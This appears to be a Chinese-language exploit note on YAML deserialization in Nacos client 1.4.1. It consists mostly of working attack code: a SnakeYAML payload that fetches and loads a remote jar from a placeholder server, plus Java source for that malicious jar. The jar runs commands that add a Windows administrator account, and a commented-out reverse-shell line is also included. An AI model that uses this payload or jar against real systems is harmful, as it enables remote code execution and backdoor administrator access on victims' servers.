## Nacos Client Yaml 反序列化
漏洞依赖
```xml
<dependency>
    <groupId>com.alibaba.nacos</groupId>
    <artifactId>nacos-client</artifactId>
    <version>1.4.1</version>
</dependency>
```

>需要在Client中配置（dataId&group）才能触发yaml反序列化

```YAML
!!javax.script.ScriptEngineManager [  
  !!java.net.URLClassLoader [[  
    !!java.net.URL ["http://vps:8000/yaml-payload.jar"]  
   ]]  
 ]
```

恶意jar

```JAVA
import javax.script.ScriptEngine;  
import javax.script.ScriptEngineFactory;  
import java.io.IOException;  
import java.util.List;  
  
public class NacosScriptEngineFactory implements ScriptEngineFactory {  
    public NacosScriptEngineFactory() {  
        try {  
//            Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port 0>&1");  
            // windows 添加管理员  
            Runtime.getRuntime().exec("net user wum0nster Admin123 /add");  
            Runtime.getRuntime().exec("net localgroup administrators wum0nster /add");  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
    }  
  
    @Override  
    public String getEngineName() {  
        return null;  
    }  
  
    @Override  
    public String getEngineVersion() {  
        return null;  
    }  
  
    @Override  
    public List<String> getExtensions() {  
        return null;  
    }  
  
    @Override  
    public List<String> getMimeTypes() {  
        return null;  
    }  
  
    @Override  
    public List<String> getNames() {  
        return null;  
    }  
  
    @Override  
    public String getLanguageName() {  
        return null;  
    }  
  
    @Override  
    public String getLanguageVersion() {  
        return null;  
    }  
  
    @Override  
    public Object getParameter(String key) {  
        return null;  
    }  
  
    @Override  
    public String getMethodCallSyntax(String obj, String m, String... args) {  
        return null;  
    }  
  
    @Override  
    public String getOutputStatement(String toDisplay) {  
        return null;  
    }  
  
    @Override  
    public String getProgram(String... statements) {  
        return null;  
    }  
  
    @Override  
    public ScriptEngine getScriptEngine() {  
        return null;  
    }  
}
```